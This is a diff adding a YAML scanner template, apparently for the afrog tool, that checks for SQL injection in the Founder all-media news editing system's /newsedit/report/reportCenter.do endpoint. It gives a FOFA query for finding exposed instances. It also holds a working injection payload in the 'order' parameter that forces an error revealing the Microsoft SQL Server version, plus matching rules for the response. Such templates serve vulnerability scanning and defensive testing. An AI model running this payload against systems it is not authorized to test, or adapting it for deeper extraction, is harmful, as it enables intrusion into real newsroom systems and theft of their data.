@@ -1,0 +1,21 @@
+id: founder-report-center-do-sqli
+
+info:
+  name: 方正畅享全媒体新闻采编系统 reportCenter.do sql注入
+  author: zan8in
+  severity: high
+  verifide: true
+  description: |-
+    方正畅享全媒体新闻采编系统 reportCenter.do sql注入
+    fofa: app="FOUNDER-全媒体采编系统"
+  tags: 方正,方正畅享全媒体新闻采编系统,sqli
+  created: 2025/03/10
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /newsedit/report/reportCenter.do
+      body: type=paperLayoutList&paperDate=2024-10-1&token=1&pageNo=1&pageSize=1&order=x' THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where cast(@@version as int)=5-- a
+    expression: response.status == 200 && response.body.ibcontains(b"<result><error>othererror</error>") && response.body.ibcontains(b"microsoft sql server")
+expression: r0()
